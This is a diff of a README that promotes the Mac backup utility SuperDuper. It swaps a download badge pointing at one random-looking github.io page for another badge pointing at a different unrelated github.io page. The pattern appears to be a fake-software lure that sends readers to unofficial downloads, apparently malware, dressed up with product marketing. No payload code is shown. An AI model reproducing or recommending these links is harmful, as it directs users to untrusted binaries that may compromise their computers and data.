@@ -4,12 +4,6 @@
 <img src="https://softifix.com/wp-content/uploads/2024/03/mac-backup-software-superduper.jpg" alt="SuperDuper Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://shikikofa1593.github.io/.github/superduper">  
-<img src="https://img.shields.io/badge/GET_SuperDuper-darkblue?style=for-the-badge&logo=apple" alt="GET SuperDuper">  
-</a>  
-</div>  
-
 ---
 
 ## What is SuperDuper?
@@ -17,6 +11,8 @@
 ![SuperDuper in Action](https://s3.amazonaws.com/com.shirtpocket/SuperDuper/graphics/SuperDuper-Main.png)
 
 SuperDuper is the gold standard for creating bootable backups on Apple computers. This robust cloning utility delivers peace of mind by producing exact, byte-for-byte copies of your system drive. Whether you are safeguarding personal documents or managing corporate workstations, SuperDuper ensures your data remains secure and instantly recoverable.
+
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://balotkfoodywwaej.github.io/.github/superduper-backup-utility)
 
 The core strength of SuperDuper lies in its unparalleled reliability and straightforward operation. It excels at creating perfect replicas that are ready to boot from, minimizing downtime in case of a primary disk failure. The integrated scheduler allows for automated, hands-free backups that run in the background using the innovative Smart Update feature to only transfer new or modified files, saving significant time and storage space.
 
